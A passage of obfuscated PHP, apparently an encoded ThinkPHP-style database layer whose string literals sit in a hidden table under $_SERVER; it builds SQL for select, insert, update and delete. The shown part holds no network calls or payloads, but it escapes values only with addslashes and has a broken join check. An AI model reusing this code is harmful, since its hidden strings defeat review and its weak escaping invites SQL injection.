} protected function parseBind($‚Ã£âÍÎ) { $‚Ã£âÍÎ = array_merge($this->bind, $‚Ã£âÍÎ); $this->bind = array(); return $‚Ã£âÍÎ; } function parseKey(&$Ôı¨“ğ‰, $„×àÉ›ƒ = true) { if ($„×àÉ›ƒ) { $Ôı¨“ğ‰ = $this->parseKeyCheck($Ôı¨“ğ‰); } return $Ôı¨“ğ‰; } function parseKeyCheck($”¬›òó) { $¿›Áùã =& $_SERVER[ò«¥Ê‡å]; $”¬›òó = trim($”¬›òó); if (!preg_match($¿›Áùã[1043], $”¬›òó)) { think_exception($¿›Áùã[1044] . $”¬›òó); } return $”¬›òó; } protected function parseValue($»Ôá¿Ó) { $Îë´Şêê =& $_SERVER[ò«¥Ê‡å]; if (is_string($»Ôá¿Ó)) { $»Ôá¿Ó = $Îë´Şêê[1004] . $this->escapeString($»Ôá¿Ó) . $Îë´Şêê[1004]; } elseif (isset($»Ôá¿Ó[0]) && is_string($»Ôá¿Ó[0]) && strtolower($»Ôá¿Ó[0]) == $Îë´Şêê[343]) { $»Ôá¿Ó = $this->escapeString($»Ôá¿Ó[1]); } elseif (is_array($»Ôá¿Ó)) { $»Ôá¿Ó = array_map(array($this, $Îë´Şêê[1005]), $»Ôá¿Ó); } elseif (is_bool($»Ôá¿Ó)) { $»Ôá¿Ó = $»Ôá¿Ó ? $Îë´Şêê[90] : $Îë´Şêê[214]; } elseif (is_null($»Ôá¿Ó)) { $»Ôá¿Ó = $Îë´Şêê[105]; } return $»Ôá¿Ó; } protected function parseField($÷ÆØ‘Ñª) { $ìçœ”¡œ =& $_SERVER[ò«¥Ê‡å]; if (is_string($÷ÆØ‘Ñª) && strpos($÷ÆØ‘Ñª, $ìçœ”¡œ[50])) { $÷ÆØ‘Ñª = explode($ìçœ”¡œ[50], $÷ÆØ‘Ñª); } if (is_array($÷ÆØ‘Ñª)) { $¡ñ‘Ç‘ = array(); foreach ($÷ÆØ‘Ñª as $İ§ãøÄ— => $ªœŞ‹å¦) { if (!is_numeric($İ§ãøÄ—)) { $¡ñ‘Ç‘[] = $this->parseKey($İ§ãøÄ—, !1) . $ìçœ”¡œ[1045] . $this->parseKey($ªœŞ‹å¦); } else { $¡ñ‘Ç‘[] = $this->parseKey($ªœŞ‹å¦); } } $½“ëï = implode($ìçœ”¡œ[50], $¡ñ‘Ç‘); } elseif (is_string($÷ÆØ‘Ñª) && !empty($÷ÆØ‘Ñª)) { $½“ëï = $÷ÆØ‘Ñª; } else { $½“ëï = $ìçœ”¡œ[205]; } return $½“ëï; } protected function parseTable($¨—¸÷Ô‘) { $åÁß“ =& $_SERVER[ò«¥Ê‡å]; if (is_array($¨—¸÷Ô‘)) { $¡¶ÕÀÎ’ = array(); foreach ($¨—¸÷Ô‘ as $› Éïâİ => $ÏÇ¶˜™) { if (!is_numeric($› Éïâİ)) { $¡¶ÕÀÎ’[] = $this->parseKey($› Éïâİ) . $åÁß“[53] . $this->parseKey($ÏÇ¶˜™); } else { $¡¶ÕÀÎ’[] = $this->parseKey($› Éïâİ); } } $¨—¸÷Ô‘ = $¡¶ÕÀÎ’; } elseif (is_string($¨—¸÷Ô‘)) { if (strstr($¨—¸÷Ô‘, $åÁß“[53])) { return $¨—¸÷Ô‘; } $¨—¸÷Ô‘ = explode($åÁß“[50], $¨—¸÷Ô‘); array_walk($¨—¸÷Ô‘, array($this, $åÁß“[953])); } return $åÁß“[947] . trim(implode($åÁß“[1046], $¨—¸÷Ô‘), $åÁß“[431]) . $åÁß“[947]; } protected function parseWhere($»Ä½¬ß¢) { $¡óÈ¯ÀŒ =& $_SERVER[ò«¥Ê‡å]; $é•ÜÍî‚ = $¡óÈ¯ÀŒ[12]; if (is_string($»Ä½¬ß¢)) { $é•ÜÍî‚ = $»Ä½¬ß¢; } else { $ÛŒÑ¸–” = isset($»Ä½¬ß¢[$¡óÈ¯ÀŒ[1047]]) ? strtoupper($»Ä½¬ß¢[$¡óÈ¯ÀŒ[1047]]) : $¡óÈ¯ÀŒ[12]; if (in_array($ÛŒÑ¸–”, array($¡óÈ¯ÀŒ[1048], $¡óÈ¯ÀŒ[1049], $¡óÈ¯ÀŒ[1050]))) { $ÛŒÑ¸–” = $¡óÈ¯ÀŒ[53] . $ÛŒÑ¸–” . $¡óÈ¯ÀŒ[53]; unset($»Ä½¬ß¢[$¡óÈ¯ÀŒ[1047]]); } else { $ÛŒÑ¸–” = $¡óÈ¯ÀŒ[1051]; } foreach ($»Ä½¬ß¢ as $ÕÊÖ‘— => $úğ£¼á¸) { $é•ÜÍî‚ .= $¡óÈ¯ÀŒ[323]; if (is_numeric($ÕÊÖ‘—)) { $ÕÊÖ‘— = $¡óÈ¯ÀŒ[1052]; } if (0 === strpos($ÕÊÖ‘—, $¡óÈ¯ÀŒ[11])) { $é•ÜÍî‚ .= $this->parseThinkWhere($ÕÊÖ‘—, $úğ£¼á¸); } else { if (!preg_match($¡óÈ¯ÀŒ[1053], trim($ÕÊÖ‘—))) { think_exception(think_lang($¡óÈ¯ÀŒ[1054]) . $¡óÈ¯ÀŒ[4] . $ÕÊÖ‘—); } $ßŒ£îÁó = is_array($úğ£¼á¸) && isset($úğ£¼á¸[$¡óÈ¯ÀŒ[1055]]); $ÕÊÖ‘— = trim($ÕÊÖ‘—); if (strpos($ÕÊÖ‘—, $¡óÈ¯ÀŒ[329])) { $ÂŠ•’¥– = explode($¡óÈ¯ÀŒ[329], $ÕÊÖ‘—); $Ç–¶‰ŠÇ = array(); foreach ($ÂŠ•’¥– as $“àÄ¯ºÛ => $›©¨Óã) { $¨àÓ™¹ş = $ßŒ£îÁó ? $úğ£¼á¸[$“àÄ¯ºÛ] : $úğ£¼á¸; $Ç–¶‰ŠÇ[] = $¡óÈ¯ÀŒ[306] . $this->parseWhereItem($this->parseKey($›©¨Óã), $¨àÓ™¹ş) . $¡óÈ¯ÀŒ[952]; } $é•ÜÍî‚ .= implode($¡óÈ¯ÀŒ[1056], $Ç–¶‰ŠÇ); } elseif (strpos($ÕÊÖ‘—, $¡óÈ¯ÀŒ[330])) { $ÂŠ•’¥– = explode($¡óÈ¯ÀŒ[330], $ÕÊÖ‘—); $Ç–¶‰ŠÇ = array(); foreach ($ÂŠ•’¥– as $“àÄ¯ºÛ => $›©¨Óã) { $¨àÓ™¹ş = $ßŒ£îÁó ? $úğ£¼á¸[$“àÄ¯ºÛ] : $úğ£¼á¸; $Ç–¶‰ŠÇ[] = $¡óÈ¯ÀŒ[306] . $this->parseWhereItem($this->parseKey($›©¨Óã), $¨àÓ™¹ş) . $¡óÈ¯ÀŒ[952]; } $é•ÜÍî‚ .= implode($¡óÈ¯ÀŒ[1051], $Ç–¶‰ŠÇ); } else { $é•ÜÍî‚ .= $this->parseWhereItem($this->parseKey($ÕÊÖ‘—), $úğ£¼á¸); } } $é•ÜÍî‚ .= $¡óÈ¯ÀŒ[324] . $ÛŒÑ¸–”; } $é•ÜÍî‚ = substr($é•ÜÍî‚, 0, -strlen($ÛŒÑ¸–”)); } return empty($é•ÜÍî‚) ? $¡óÈ¯ÀŒ[12] : $¡óÈ¯ÀŒ[1057] . $é•ÜÍî‚; } protected function parseWhereItem($•®ºÛê¦, $¾¨íõ±—) { $®‹˜¥Ô• =& $_SERVER[ò«¥Ê‡å]; $íûş‚Ğ = $®‹˜¥Ô•[12]; if (is_array($¾¨íõ±—)) { if (is_string($¾¨íõ±—[0])) { $¡ıü× = strtolower($¾¨íõ±—[0]); if (in_array($¾¨íõ±—[0], array($®‹˜¥Ô•[931], $®‹˜¥Ô•[1058], $®‹˜¥Ô•[1059], $®‹˜¥Ô•[1060], $®‹˜¥Ô•[1061], $®‹˜¥Ô•[1062]))) { $íûş‚Ğ .= $•®ºÛê¦ . $®‹˜¥Ô•[53] . $¾¨íõ±—[0] . $®‹˜¥Ô•[53] . $this->parseValue($¾¨íõ±—[1]); } elseif (preg_match($®‹˜¥Ô•[1063], $¾¨íõ±—[0])) { $íûş‚Ğ .= $•®ºÛê¦ . $®‹˜¥Ô•[53] . $this->exp[$¡ıü×] . $®‹˜¥Ô•[53] . $this->parseValue($¾¨íõ±—[1]); } elseif (preg_match($®‹˜¥Ô•[1064], $¾¨íõ±—[0])) { if (is_array($¾¨íõ±—[1])) { $Õ‚†á‡¨ = isset($¾¨íõ±—[2]) ? strtoupper($¾¨íõ±—[2]) : $®‹˜¥Ô•[1049]; if (in_array($Õ‚†á‡¨, array($®‹˜¥Ô•[1048], $®‹˜¥Ô•[1049], $®‹˜¥Ô•[1050]))) { $ùûÆÎ€¤ = array(); foreach ($¾¨íõ±—[1] as $î‰ùõ) { $ùûÆÎ€¤[] = $•®ºÛê¦ . $®‹˜¥Ô•[53] . $this->exp[$¡ıü×] . $®‹˜¥Ô•[53] . $this->parseValue($î‰ùõ); } $íûş‚Ğ .= $®‹˜¥Ô•[306] . implode($®‹˜¥Ô•[53] . $Õ‚†á‡¨ . $®‹˜¥Ô•[53], $ùûÆÎ€¤) . $®‹˜¥Ô•[952]; } } else { $íûş‚Ğ .= $•®ºÛê¦ . $®‹˜¥Ô•[53] . $this->exp[$¡ıü×] . $®‹˜¥Ô•[53] . $this->parseValue($¾¨íõ±—[1]); } } elseif ($®‹˜¥Ô•[343] == $¡ıü×) { $íûş‚Ğ .= $®‹˜¥Ô•[950] . $•®ºÛê¦ . $®‹˜¥Ô•[53] . $¾¨íõ±—[1] . $®‹˜¥Ô•[1065]; } elseif (preg_match($®‹˜¥Ô•[1066], $¾¨íõ±—[0])) { $íûş‚Ğ .= $¾¨íõ±—[0]; } elseif (preg_match($®‹˜¥Ô•[1067], $¾¨íõ±—[0])) { if (isset($¾¨íõ±—[2]) && $®‹˜¥Ô•[343] == $¾¨íõ±—[2]) { $íûş‚Ğ .= $•®ºÛê¦ . $®‹˜¥Ô•[53] . $this->exp[$¡ıü×] . $®‹˜¥Ô•[53] . $¾¨íõ±—[1]; } else { if (is_string($¾¨íõ±—[1])) { $¾¨íõ±—[1] = explode($®‹˜¥Ô•[50], $¾¨íõ±—[1]); } $ÚÓ¹˜ëî = implode($®‹˜¥Ô•[50], $this->parseValue($¾¨íõ±—[1])); $íûş‚Ğ .= $•®ºÛê¦ . $®‹˜¥Ô•[53] . $this->exp[$¡ıü×] . $®‹˜¥Ô•[950] . $ÚÓ¹˜ëî . $®‹˜¥Ô•[952]; } } elseif (preg_match($®‹˜¥Ô•[1068], $¾¨íõ±—[0])) { $ã¯áëÛ± = is_string($¾¨íõ±—[1]) ? explode($®‹˜¥Ô•[50], $¾¨íõ±—[1]) : $¾¨íõ±—[1]; $íûş‚Ğ .= $®‹˜¥Ô•[950] . $•®ºÛê¦ . $®‹˜¥Ô•[53] . $this->exp[$¡ıü×] . $®‹˜¥Ô•[53] . $this->parseValue($ã¯áëÛ±[0]) . $®‹˜¥Ô•[1051] . $this->parseValue($ã¯áëÛ±[1]) . $®‹˜¥Ô•[324]; } else { think_exception(think_lang($®‹˜¥Ô•[1054]) . $®‹˜¥Ô•[4] . $¾¨íõ±—[0]); } } else { $æÈÜìı = count($¾¨íõ±—); $‰‚Î´§ = $®‹˜¥Ô•[12]; if (is_string($¾¨íõ±—[$æÈÜìı - 1])) { $‰‚Î´§ = isset($¾¨íõ±—[$æÈÜìı - 1]) ? strtoupper($¾¨íõ±—[$æÈÜìı - 1]) : $®‹˜¥Ô•[12]; if (in_array($‰‚Î´§, array($®‹˜¥Ô•[1048], $®‹˜¥Ô•[1049], $®‹˜¥Ô•[1050]))) { $æÈÜìı = $æÈÜìı - 1; } } else { $‰‚Î´§ = $®‹˜¥Ô•[1048]; } for ($ÜÏ’¿Š¶ = 0; $ÜÏ’¿Š¶ < $æÈÜìı; $ÜÏ’¿Š¶++) { $ã¯áëÛ± = is_array($¾¨íõ±—[$ÜÏ’¿Š¶]) ? $¾¨íõ±—[$ÜÏ’¿Š¶][1] : $¾¨íõ±—[$ÜÏ’¿Š¶]; if ($®‹˜¥Ô•[343] == strtolower($¾¨íõ±—[$ÜÏ’¿Š¶][0])) { $íûş‚Ğ .= $®‹˜¥Ô•[306] . $•®ºÛê¦ . $®‹˜¥Ô•[53] . $ã¯áëÛ± . $®‹˜¥Ô•[1065] . $‰‚Î´§ . $®‹˜¥Ô•[53]; } else { $‡®²¡Ğ‹ = is_array($¾¨íõ±—[$ÜÏ’¿Š¶]) ? $this->exp[strtolower($¾¨íõ±—[$ÜÏ’¿Š¶][0])] : $®‹˜¥Ô•[931]; if (!$‡®²¡Ğ‹ && is_array($¾¨íõ±—[$ÜÏ’¿Š¶]) && in_array($¾¨íõ±—[$ÜÏ’¿Š¶][0], array($®‹˜¥Ô•[931], $®‹˜¥Ô•[1058], $®‹˜¥Ô•[1059], $®‹˜¥Ô•[1060], $®‹˜¥Ô•[1061], $®‹˜¥Ô•[1062]))) { $‡®²¡Ğ‹ = $¾¨íõ±—[$ÜÏ’¿Š¶][0]; } $íûş‚Ğ .= $®‹˜¥Ô•[306] . $•®ºÛê¦ . $®‹˜¥Ô•[53] . $‡®²¡Ğ‹ . $®‹˜¥Ô•[53] . $this->parseValue($ã¯áëÛ±) . $®‹˜¥Ô•[1065] . $‰‚Î´§ . $®‹˜¥Ô•[53]; } } $íûş‚Ğ = substr($íûş‚Ğ, 0, -4); } } else { $íûş‚Ğ .= $•®ºÛê¦ . $®‹˜¥Ô•[1069] . $this->parseValue($¾¨íõ±—); } return $íûş‚Ğ; } protected function parseThinkWhere($û™ğİáÌ, $íÇİ€¶İ) { $‰›é¹ó  =& $_SERVER[ò«¥Ê‡å]; $¸®úëÑÙ = $‰›é¹ó [12]; switch ($û™ğİáÌ) { case $‰›é¹ó [398]: $¸®úëÑÙ = $íÇİ€¶İ; break; case $‰›é¹ó [1052]: $¸®úëÑÙ = is_string($íÇİ€¶İ) ? $íÇİ€¶İ : substr($this->parseWhere($íÇİ€¶İ), 6); break; case $‰›é¹ó [1070]: parse_str($íÇİ€¶İ, $çÆò¬€); if (isset($çÆò¬€[$‰›é¹ó [1047]])) { $²²ß±”ˆ = $‰›é¹ó [53] . strtoupper($çÆò¬€[$‰›é¹ó [1047]]) . $‰›é¹ó [53]; unset($çÆò¬€[$‰›é¹ó [1047]]); } else { $²²ß±”ˆ = $‰›é¹ó [1051]; } $àÍ­¾š = array(); foreach ($çÆò¬€ as $Ö’ßÚÍÀ => $¼“ÅÖü¡) { $àÍ­¾š[] = $this->parseKey($Ö’ßÚÍÀ) . $‰›é¹ó [1069] . $this->parseValue($¼“ÅÖü¡); } $¸®úëÑÙ = implode($²²ß±”ˆ, $àÍ­¾š); break; } return $¸®úëÑÙ; } protected function parseLimit($Ş¥Ê·µ) { $µ°Îî¯ =& $_SERVER[ò«¥Ê‡å]; return !empty($Ş¥Ê·µ) ? $µ°Îî¯[51] . $Ş¥Ê·µ . $µ°Îî¯[53] : $µ°Îî¯[12]; } protected function parseJoin($ĞÈí½Ê‘) { $“›Ã”´† =& $_SERVER[ò«¥Ê‡å]; $ÌÜş‹º¤ = $“›Ã”´†[12]; if (!empty($ĞÈí½Ê‘)) { if (is_array($ĞÈí½Ê‘)) { foreach ($ĞÈí½Ê‘ as $çÕŸ…‡— => $¦©Öğ„) { if (!1 !== stripos($¦©Öğ„, $“›Ã”´†[1071])) { $ÌÜş‹º¤ .= $“›Ã”´†[53] . $¦©Öğ„; } else { $ÌÜş‹º¤ .= $“›Ã”´†[1072] . $¦©Öğ„; } } } else { $ÌÜş‹º¤ .= $“›Ã”´†[1072] . $ĞÈí½Ê‘; } } $ÌÜş‹º¤ = preg_replace($“›Ã”´†[1073], think_config($“›Ã”´†[977]) . $“›Ã”´†[1074], $ÌÜş‹º¤); return $ÌÜş‹º¤; } protected function parseOrder($©”ù–Ş©) { $Ç–ÈŞèµ =& $_SERVER[ò«¥Ê‡å]; if (is_array($©”ù–Ş©)) { $Ëğ±ˆ²æ = array(); foreach ($©”ù–Ş© as $‘ÙôàÔâ => $ÎÖ¤Ìï–) { if (is_numeric($‘ÙôàÔâ)) { $Ëğ±ˆ²æ[] = $this->parseKey($ÎÖ¤Ìï–); } else { $ÎÖ¤Ìï– = in_array(strtoupper(trim($ÎÖ¤Ìï–)), array($Ç–ÈŞèµ[1075], $Ç–ÈŞèµ[1076])) ? $Ç–ÈŞèµ[53] . $ÎÖ¤Ìï– : $Ç–ÈŞèµ[12]; if (preg_match($Ç–ÈŞèµ[1077], $‘ÙôàÔâ)) { $Ëğ±ˆ²æ[] = $this->parseKey($‘ÙôàÔâ) . $ÎÖ¤Ìï–; } else { think_exception($Ç–ÈŞèµ[1078] . $‘ÙôàÔâ); } } } $©”ù–Ş© = implode($Ç–ÈŞèµ[50], $Ëğ±ˆ²æ); } return !empty($©”ù–Ş©) ? $Ç–ÈŞèµ[1079] . $©”ù–Ş© : $Ç–ÈŞèµ[12]; } protected function parseGroup($é»œ¤°«) { $ü¤®©ò¯ =& $_SERVER[ò«¥Ê‡å]; return !empty($é»œ¤°«) ? $ü¤®©ò¯[1080] . $é»œ¤°« : $ü¤®©ò¯[12]; } protected function parseHaving($“©“Áª) { $†õ†™æ =& $_SERVER[ò«¥Ê‡å]; return !empty($“©“Áª) ? $†õ†™æ[1081] . $“©“Áª : $†õ†™æ[12]; } protected function parseComment($ïß…ºå) { $Ëã§â¨æ =& $_SERVER[ò«¥Ê‡å]; return !empty($ïß…ºå) ? $Ëã§â¨æ[1082] . $ïß…ºå . $Ëã§â¨æ[1083] : $Ëã§â¨æ[12]; } protected function parseDistinct($ñ¼Î„„‹) { $ÙöÃ¦ï =& $_SERVER[ò«¥Ê‡å]; return !empty($ñ¼Î„„‹) ? $ÙöÃ¦ï[1084] : $ÙöÃ¦ï[12]; } protected function parseUnion($Ã„‰àä½) { $•µÖ°‘Õ =& $_SERVER[ò«¥Ê‡å]; if (empty($Ã„‰àä½)) { return $•µÖ°‘Õ[12]; } if (isset($Ã„‰àä½[$•µÖ°‘Õ[394]])) { $—ë©·êÃ = $•µÖ°‘Õ[1085]; unset($Ã„‰àä½[$•µÖ°‘Õ[394]]); } else { $—ë©·êÃ = $•µÖ°‘Õ[1086]; } foreach ($Ã„‰àä½ as $Šº³®†Û) { $ıú°ñÍÕ[] = $—ë©·êÃ . (is_array($Šº³®†Û) ? $this->buildSelectSql($Šº³®†Û) : $Šº³®†Û); } return implode($•µÖ°‘Õ[53], $ıú°ñÍÕ); } public function insert($¹¬‡”ÁÖ, $±­ÀşÜğ = array(), $»êšŒŠá = false) { $ãä´© ş =& $_SERVER[ò«¥Ê‡å]; $èş‘™ÚØ = $¼‘°‰â = array(); $this->model = $±­ÀşÜğ[$ãä´© ş[327]]; foreach ($¹¬‡”ÁÖ as $ƒ·¿ÁÂÁ => $ÈµÕ½Âó) { if (is_array($ÈµÕ½Âó) && $ãä´© ş[343] == $ÈµÕ½Âó[0]) { $¼‘°‰â[] = $this->parseKey($ƒ·¿ÁÂÁ); $èş‘™ÚØ[] = $ÈµÕ½Âó[1]; } elseif (is_scalar($ÈµÕ½Âó) || is_null($ÈµÕ½Âó)) { $¼‘°‰â[] = $this->parseKey($ƒ·¿ÁÂÁ); $èş‘™ÚØ[] = $this->parseValue($ÈµÕ½Âó); } } $˜¸é–ø = ($»êšŒŠá ? $ãä´© ş[954] : $ãä´© ş[955]) . $ãä´© ş[956] . $this->parseTable($±­ÀşÜğ[$ãä´© ş[325]]) . $ãä´© ş[950] . implode($ãä´© ş[50], $¼‘°‰â) . $ãä´© ş[951] . implode($ãä´© ş[50], $èş‘™ÚØ) . $ãä´© ş[952]; $˜¸é–ø .= $this->parseLock(isset($±­ÀşÜğ[$ãä´© ş[890]]) ? $±­ÀşÜğ[$ãä´© ş[890]] : !1); $˜¸é–ø .= $this->parseComment(!empty($±­ÀşÜğ[$ãä´© ş[400]]) ? $±­ÀşÜğ[$ãä´© ş[400]] : $ãä´© ş[12]); return $this->execute($˜¸é–ø, $this->parseBind(!empty($±­ÀşÜğ[$ãä´© ş[331]]) ? $±­ÀşÜğ[$ãä´© ş[331]] : array())); } public function selectInsert($ Éáóä«, $·¬â™¢Ú, $ìà¦Ù‰ = array()) { $¿”²¥ÆÏ =& $_SERVER[ò«¥Ê‡å]; $this->model = $ìà¦Ù‰[$¿”²¥ÆÏ[327]]; if (is_string($ Éáóä«)) { $ Éáóä« = explode($¿”²¥ÆÏ[50], $ Éáóä«); } array_walk($ Éáóä«, array($this, $¿”²¥ÆÏ[953])); $‚Ä·ï‡ô = $¿”²¥ÆÏ[1087] . $this->parseTable($·¬â™¢Ú) . $¿”²¥ÆÏ[950] . implode($¿”²¥ÆÏ[50], $ Éáóä«) . $¿”²¥ÆÏ[1065]; $‚Ä·ï‡ô .= $this->buildSelectSql($ìà¦Ù‰); return $this->execute($‚Ä·ï‡ô, $this->parseBind(!empty($ìà¦Ù‰[$¿”²¥ÆÏ[331]]) ? $ìà¦Ù‰[$¿”²¥ÆÏ[331]] : array())); } public function update($ ó½‡ÚÏ, $ÛÛ×‹½) { $†‡è¹ƒé =& $_SERVER[ò«¥Ê‡å]; $this->model = $ÛÛ×‹½[$†‡è¹ƒé[327]]; $ÊğÉšŸ = $†‡è¹ƒé[1088] . $this->parseTable($ÛÛ×‹½[$†‡è¹ƒé[325]]) . $this->parseSet($ ó½‡ÚÏ) . $this->parseWhere(!empty($ÛÛ×‹½[$†‡è¹ƒé[321]]) ? $ÛÛ×‹½[$†‡è¹ƒé[321]] : $†‡è¹ƒé[12]) . $this->parseOrder(!empty($ÛÛ×‹½[$†‡è¹ƒé[411]]) ? $ÛÛ×‹½[$†‡è¹ƒé[411]] : $†‡è¹ƒé[12]) . $this->parseLimit(!empty($ÛÛ×‹½[$†‡è¹ƒé[338]]) ? $ÛÛ×‹½[$†‡è¹ƒé[338]] : $†‡è¹ƒé[12]) . $this->parseLock(isset($ÛÛ×‹½[$†‡è¹ƒé[890]]) ? $ÛÛ×‹½[$†‡è¹ƒé[890]] : !1) . $this->parseComment(!empty($ÛÛ×‹½[$†‡è¹ƒé[400]]) ? $ÛÛ×‹½[$†‡è¹ƒé[400]] : $†‡è¹ƒé[12]); return $this->execute($ÊğÉšŸ, $this->parseBind(!empty($ÛÛ×‹½[$†‡è¹ƒé[331]]) ? $ÛÛ×‹½[$†‡è¹ƒé[331]] : array())); } public function delete($îöğÒê« = array()) { $™¥ŸôŸï =& $_SERVER[ò«¥Ê‡å]; $this->model = $îöğÒê«[$™¥ŸôŸï[327]]; $¢à¦´ÁÁ = $™¥ŸôŸï[1089] . $this->parseTable($îöğÒê«[$™¥ŸôŸï[325]]) . $this->parseWhere(!empty($îöğÒê«[$™¥ŸôŸï[321]]) ? $îöğÒê«[$™¥ŸôŸï[321]] : $™¥ŸôŸï[12]) . $this->parseOrder(!empty($îöğÒê«[$™¥ŸôŸï[411]]) ? $îöğÒê«[$™¥ŸôŸï[411]] : $™¥ŸôŸï[12]) . $this->parseLimit(!empty($îöğÒê«[$™¥ŸôŸï[338]]) ? $îöğÒê«[$™¥ŸôŸï[338]] : $™¥ŸôŸï[12]) . $this->parseLock(isset($îöğÒê«[$™¥ŸôŸï[890]]) ? $îöğÒê«[$™¥ŸôŸï[890]] : !1) . $this->parseComment(!empty($îöğÒê«[$™¥ŸôŸï[400]]) ? $îöğÒê«[$™¥ŸôŸï[400]] : $™¥ŸôŸï[12]); return $this->execute($¢à¦´ÁÁ, $this->parseBind(!empty($îöğÒê«[$™¥ŸôŸï[331]]) ? $îöğÒê«[$™¥ŸôŸï[331]] : array())); } public function select($÷Ø°Š± = array()) { $şÛ••¼ï =& $_SERVER[ò«¥Ê‡å]; $this->model = $÷Ø°Š±[$şÛ••¼ï[327]]; $òŠÏ¥š = $this->buildSelectSql($÷Ø°Š±); $ëƒ£é¼Ø = isset($÷Ø°Š±[$şÛ••¼ï[395]]) ? $÷Ø°Š±[$şÛ••¼ï[395]] : !1; if ($ëƒ£é¼Ø) { $¹À³¸È = is_string($ëƒ£é¼Ø[$şÛ••¼ï[96]]) ? $ëƒ£é¼Ø[$şÛ••¼ï[96]] : $şÛ••¼ï[1090] . md5($òŠÏ¥š); $Ş¥òµı = think_cache($¹À³¸È, $şÛ••¼ï[12], $ëƒ£é¼Ø); if (!1 !== $Ş¥òµı) { return $Ş¥òµı; } } $‘â®‰Í = $this->query($òŠÏ¥š, $this->parseBind(!empty($÷Ø°Š±[$şÛ••¼ï[331]]) ? $÷Ø°Š±[$şÛ••¼ï[331]] : array())); if ($ëƒ£é¼Ø && !1 !== $‘â®‰Í) { think_cache($¹À³¸È, $‘â®‰Í, $ëƒ£é¼Ø); } return $‘â®‰Í; } public function buildSelectSql($‘¼ÛÁ¿› = array()) { $³Ö¾ˆ´ =& $_SERVER[ò«¥Ê‡å]; if (isset($‘¼ÛÁ¿›[$³Ö¾ˆ´[399]])) { if (strpos($‘¼ÛÁ¿›[$³Ö¾ˆ´[399]], $³Ö¾ˆ´[50])) { list($ÈÂßñ³º, $ˆ“ µ•‡) = explode($³Ö¾ˆ´[50], $‘¼ÛÁ¿›[$³Ö¾ˆ´[399]]); } else { $ÈÂßñ³º = $‘¼ÛÁ¿›[$³Ö¾ˆ´[399]]; } $ÈÂßñ³º = $ÈÂßñ³º ? $ÈÂßñ³º : 1; $ˆ“ µ•‡ = isset($ˆ“ µ•‡) ? $ˆ“ µ•‡ : (is_numeric($‘¼ÛÁ¿›[$³Ö¾ˆ´[338]]) ? $‘¼ÛÁ¿›[$³Ö¾ˆ´[338]] : 20); $Ì‡³òá = $ˆ“ µ•‡ * ((int) $ÈÂßñ³º - 1); $‘¼ÛÁ¿›[$³Ö¾ˆ´[338]] = $Ì‡³òá . $³Ö¾ˆ´[50] . $ˆ“ µ•‡; } if (think_config($³Ö¾ˆ´[1091])) { $¨»Şµ = $³Ö¾ˆ´[1092] . md5(serialize($‘¼ÛÁ¿›)); $¼âÃĞìÜ = think_cache($¨»Şµ); if ($¼âÃĞìÜ) { return $¼âÃĞìÜ; } } $æŠµçš¬ = $this->parseSql($this->selectSql, $‘¼ÛÁ¿›); $æŠµçš¬ .= $this->parseLock(isset($‘¼ÛÁ¿›[$³Ö¾ˆ´[890]]) ? $‘¼ÛÁ¿›[$³Ö¾ˆ´[890]] : !1); if (isset($¨»Şµ)) { think_cache($¨»Şµ, $æŠµçš¬); } return $æŠµçš¬; } public function parseSql($•ìåÔô¼, $«×ëª± = array()) { $õŠÉ°± =& $_SERVER[ò«¥Ê‡å]; $•ìåÔô¼ = str_replace(array($õŠÉ°±[1093], $õŠÉ°±[1094], $õŠÉ°±[1095], $õŠÉ°±[1096], $õŠÉ°±[1097], $õŠÉ°±[1098], $õŠÉ°±[1099], $õŠÉ°±[1100], $õŠÉ°±[1101], $õŠÉ°±[1102], $õŠÉ°±[1103]), array($this->parseTable("{$«×ëª±[$õŠÉ°±[325]]}"), $this->parseDistinct(isset($«×ëª±[$õŠÉ°±[1104]]) ? $«×ëª±[$õŠÉ°±[1104]] : !1), $this->parseField(!empty($«×ëª±[$õŠÉ°±[319]]) ? $«×ëª±[$õŠÉ°±[319]] : $õŠÉ°±[205]), $this->parseJoin(!empty($«×ëª±[$õŠÉ°±[328]]) ? $«×ëª±[$õŠÉ°±[328]] : $õŠÉ°±[12]), $this->parseWhere(!empty($«×ëª±[$õŠÉ°±[321]]) ? $«×ëª±[$õŠÉ°±[321]] : $õŠÉ°±[12]), $this->parseGroup(!empty($«×ëª±[$õŠÉ°±[549]]) ? $«×ëª±[$õŠÉ°±[549]] : $õŠÉ°±[12]), $this->parseHaving(!empty($«×ëª±[$õŠÉ°±[1105]]) ? $«×ëª±[$õŠÉ°±[1105]] : $õŠÉ°±[12]), $this->parseOrder(!empty($«×ëª±[$õŠÉ°±[411]]) ? $«×ëª±[$õŠÉ°±[411]] : $õŠÉ°±[12]), $this->parseLimit(!empty($«×ëª±[$õŠÉ°±[338]]) ? $«×ëª±[$õŠÉ°±[338]] : $õŠÉ°±[12]), $this->parseUnion(!empty($«×ëª±[$õŠÉ°±[393]]) ? $«×ëª±[$õŠÉ°±[393]] : $õŠÉ°±[12]), $this->parseComment(!empty($«×ëª±[$õŠÉ°±[400]]) ? $«×ëª±[$õŠÉ°±[400]] : $õŠÉ°±[12])), $•ìåÔô¼); return $•ìåÔô¼; } public function getLastSql($„Â Ö•í = '') { return $„Â Ö•í ? $this->modelSql[$„Â Ö•í] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¾×ºË¼) { return addslashes($¾×ºË¼); } public function setModel($ä­æçˆ) { $this->model = $ä­æçˆ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($Æó¿öÄ = array()) { $‹–ËÒ±Å =& $_SERVER[ò«¥Ê‡å]; if (empty($Æó¿öÄ)) { $Æó¿öÄ = $GLOBALS[$‹–ËÒ±Å[6]][$‹–ËÒ±Å[21]]; } $this->database = $Æó¿öÄ; } public function model($¬õ´øˆ¡ = '') { return new ModelBase($¬õ´øˆ¡, $_SERVER[ò«¥Ê‡å][12], $this->database); } public function db($üĞ§ ã‚ = false) { $Úíİ¢ş˜ =& $_SERVER[ò«¥Ê‡å]; $³Î¨êÀö = array_change_key_case($this->database); if ($this->dbType() == $Úíİ¢ş˜[13] || !$üĞ§ ã‚) { return $this->model()->db(); } $·¿¶‡Ë½ = $³Î¨êÀö[$Úíİ¢ş˜[1019]]; $³Î¨êÀö[$Úíİ¢ş˜[1019]] = $Úíİ¢ş˜[12]; if ($³Î¨êÀö[$Úíİ¢ş˜[1014]] == $Úíİ¢ş˜[1011]) { $÷ÒµãÕÉ = 